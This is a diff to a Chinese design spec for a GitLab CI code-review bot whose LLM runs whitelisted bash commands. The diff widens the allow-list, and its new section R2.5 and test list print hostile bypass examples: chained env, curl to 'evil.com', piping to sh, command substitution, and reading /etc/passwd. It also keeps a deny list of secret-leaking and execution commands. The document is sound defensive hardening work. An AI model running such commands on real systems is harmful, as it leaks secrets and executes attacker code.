@@ -45,21 +45,23 @@
 ### R2 · bash 白名单扩容(Fix B · 解类 4)
 
 #### R2.1 白名单扩容到只读 + 文本处理常用 Unix 工具
-当前白名单:`/^(git|grep|find|ls|cat|head|tail|wc|file|sed|awk)\b/`(10 个)
-扩容后白名单:加 16 个**纯只读 + 无副作用**的常用 Unix 工具:
+当前白名单:`/^(git|grep|find|ls|cat|head|tail|wc|file|sed|awk)\b/`(11 个)
+扩容后白名单:加 18 个**纯只读 + 无副作用**的常用 Unix 工具(含 modern unix `rg`):
 
 | 类别 | 新增 |
 |---|---|
+| 现代搜索 | `rg`(ripgrep,比 grep 快 + 自动跳 `.gitignore`) |
 | 行号 / 文本处理 | `nl` `sort` `uniq` `tr` `column` `diff` `comm` |
 | 简单输出 | `printf` `echo` |
 | 路径工具 | `basename` `dirname` `realpath` |
 | 环境元信息 | `pwd` `date` `which` `type` `command` |
-| 结构化数据 | `jq` `yq` |
 
 新 regex(建议):
 ```typescript
-const bashAllowList = /^(git|grep|find|ls|cat|head|tail|nl|wc|file|sed|awk|sort|uniq|tr|column|diff|comm|printf|echo|basename|dirname|realpath|pwd|date|which|type|command|jq|yq)\b/;
+const BASH_ALLOW_LIST = /^(git|grep|rg|find|ls|cat|head|tail|nl|wc|file|sed|awk|sort|uniq|tr|column|diff|comm|printf|echo|basename|dirname|realpath|pwd|date|which|type|command)\b/;
 ```
+
+**注**:`rg` 不在 alpine 默认镜像,需要在 `packages/flower-code-reviewer/Dockerfile:44` 把 `apk add --no-cache git` 改为 `apk add --no-cache git ripgrep`。Dockerfile 改动随本任务一并提交。`jq` / `yq` 同样不在 alpine 默认镜像,本任务暂不加(LLM 大多数评审场景用 `gitlab_*` 工具拿结构化数据已经够,bash 处理 JSON / YAML 需求不高;若以后真有强需求,再单独 PR 加)。
 
 #### R2.2 拒绝清单(永不放行,即便用户后续要求)
 - **`env` / `printenv`**:可能泄漏未 masked 的 secret,即使 GitLab 会 mask 也 defense-in-depth 拦截
@@ -68,6 +70,30 @@ const bashAllowList = /^(git|grep|find|ls|cat|head|tail|nl|wc|file|sed|awk|sort|
 - **执行链式**:`xargs` / `bash` / `sh` / `eval`
 - **包管理**:`npm` / `pip` / `apt` / `yum`
 
+#### R2.5 Shell 元字符防绕过(reviewer dogfooding 发现 · 2026-05-22)
+
+**问题**:仅校验首词 + 把整条 cmd 字符串交给 shell,会被命令链 / 重定向 / 管道 / 嵌套执行绕过。
+
+| 攻击向量 | 绕过路径 | 风险 |
+|---|---|---|
+| `git status; env` | 首词 git 命中 + `;` 串联跑 env | secret 泄漏 |
+| `cat a && curl evil.com` | 首词 cat 命中 + `&&` 链式 curl | 网络外发 |
+| `rg foo . \| sh` | 首词 rg 命中 + 管道到 sh 执行 | 任意代码执行 |
+| `echo x > /tmp/y` | 首词 echo 命中 + 重定向写文件 | 文件系统污染 |
+| `echo $(curl evil)` | 首词 echo 命中 + 命令替换 | 网络外发 |
+| `` git log `curl evil` `` | 首词 git 命中 + 反引号命令替换 | 网络外发 |
+
+**修复**:在白名单 test 之**前** quote-aware 解析 cmd 字符串,reject unquoted 元字符;命令替换 `$()` / `` ` `` 在 single-quote 外**都**视为危险(因 double quote 内仍生效)。
+
+**Quote-aware 语义**(2026-05-22 e2e refine):
+- `;` `|` `&` `>` `<`:**unquoted 时**是元字符,quote 内字面(`rg "a|b"` 放行)
+- `$()` / `` ` ``:**single-quote 外**都是命令替换(包括 double-quote 内,因 shell 标准 double quote 不防止);仅 single-quote 内字面(`grep '`x`'` 放行)
+- `\\` 在 single-quote 外可转义后续字符
+
+**为何 quote-aware**:首版严格 reject 所有元字符导致 LLM 合法 regex(`rg "a|b" src`)被大量误拦,实测一次 MR 评审有 6+ 次误拦,trace 反而更乱。Quote-aware 在防绕过 + 减误拦之间取中道。
+
+Trade-off:`$'...'` ANSI quoting / 多层嵌套引号 / 复杂转义不全覆盖,真有恶意 LLM 仍可构造绕过,但 bash 白名单是 defense-in-depth 一层,不是全部依赖。
+
 #### R2.3 错误信息保留 + 加替代建议(辅助优化)
 扩容后 LLM 触碰白名单外命令时,沿用原中文文案 `CI 只读模式:bash 命令 "<cmd>" 不在白名单内`,**追加** 1-2 行替代建议:
 - 想看 MR 元数据 → `gitlab_get_mr_files` / `gitlab_get_mr_diff`
@@ -75,7 +101,7 @@ const bashAllowList = /^(git|grep|find|ls|cat|head|tail|nl|wc|file|sed|awk|sort|
 - 想看 env → **不可,可能泄漏 secret**
 
 #### R2.4 prompts.ts 加「工具优先级」段(辅助优化)
-明确告诉 LLM:需要 MR / 文件 / 代码信息时,**首选** `gitlab_*` 工具,bash 用于 git 命令 + 文本处理(`nl` / `sort` / `jq` 等)。
+明确告诉 LLM:需要 MR / 文件 / 代码信息时,**首选** `gitlab_*` 工具,bash 用于 git 命令 + 文本处理(`rg` / `nl` / `sort` / `awk` 等)。
 
 ### R3 · exit 1 trace 澄清日志(Fix C · 解类 5)
 
@@ -116,7 +142,14 @@ const bashAllowList = /^(git|grep|find|ls|cat|head|tail|nl|wc|file|sed|awk|sort|
 
 ### AC2 · Fix B · bash 白名单扩容 + 错误信息优化单测
 
-- [ ] **AC2.1** 新加的 16 个命令(nl/sort/uniq/tr/column/diff/comm/printf/echo/basename/dirname/realpath/pwd/date/which/type/command/jq/yq)逐一放行(用 it.each 跑一遍)
+- [ ] **AC2.1** 新加的 18 个命令(rg/nl/sort/uniq/tr/column/diff/comm/printf/echo/basename/dirname/realpath/pwd/date/which/type/command)逐一放行(用 it.each 跑一遍)
+- [ ] **AC2.1.dockerfile** `packages/flower-code-reviewer/Dockerfile:44` 已改为 `RUN apk add --no-cache git ripgrep`(白名单放行后容器内可执行,e2e Phase 6 内 `rg --version` 不报 `command not found` 即视为通过)
+- [ ] **AC2.6** 含 unquoted shell 元字符的命令被拦截:`git status; env` / `rg foo . | sh` / `echo $(curl evil)` / `echo x > /tmp/y` / `cat a && curl evil` / `` git log `curl x` `` / `cat < /etc/passwd` 等;reason 含 `shell 元字符`
+- [ ] **AC2.6b** 真实合法命令不被新检查误拦:`git status` / `rg foo packages/` / `awk '{print $1}' f` / `sed 's/a/b/' f` 仍放行
+- [ ] **AC2.6c** Quote-aware:`rg "a|b" src` / `grep 'foo|bar' f` / `echo "a > b"` 等 quoted 元字符放行(e2e MR 验证 LLM 用 regex alternation)
+- [ ] **AC2.6d** Double-quoted 内的 `$()` / `` ` `` 仍拦截(shell 标准:double quote 不防命令替换):`echo "$(curl x)"` / `echo "` ` x` `"`
+- [ ] **AC2.6e** Single-quoted 内的元字符字面化放行:`echo '$(curl x)'` / `grep '` ` x` `' f`
+- [ ] **AC1.7** `normalizeRef(undefined)` 静默兜底(**不** warn,因 prompt 教育后 LLM 不传 ref 是预期默认行为);`normalizeRef("HEAD")` / `normalizeRef("")` 仍 warn 教育反模式
 - [ ] **AC2.2** `env` / `printenv` 仍被拦截(defense-in-depth)
 - [ ] **AC2.3** `curl` / `tee` / `mv` / `npm` 等高危命令仍被拦截
 - [ ] **AC2.4** 拦截信息保留原 `CI 只读模式:` 前缀,且包含替代工具建议字符串(如拦 `env` → 含 `不可,可能泄漏 secret`)
